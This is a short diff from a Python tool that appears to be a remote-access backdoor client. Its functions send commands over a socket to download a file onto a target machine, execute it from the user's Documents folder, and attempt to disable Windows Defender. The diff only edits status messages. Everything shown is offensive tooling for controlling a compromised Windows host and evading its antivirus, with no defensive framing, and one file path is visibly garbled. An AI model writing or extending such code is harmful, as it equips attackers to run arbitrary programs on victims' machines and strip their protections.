@@ -126,11 +126,13 @@ def download_file(s, link, filename):
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
-def exe_file(s, filename, filepath="%HOMEPATH%erProfile%\Documents\\"):
+def exe_file(s, filename, filepath="%HOMEPATH%erProfile%\Documents\\"): 
+    p("\x1b[1;36m[+]\x1b[0m Executing file.")
     d = '& \'.\\' + filepath + filename + "'\n"
     s.send(d)
     print(recv_a(s))
-    p("\x1b[1;36m[+]\x1b[0m Done.")
+    p()
+    p("\x1b[1;36m[+]\x1b[0m Done (Not Guranteed).")
 
 def disable_defender(s):
     p("\x1b[1;36m[+]\x1b[0m Trying to disable defender.")
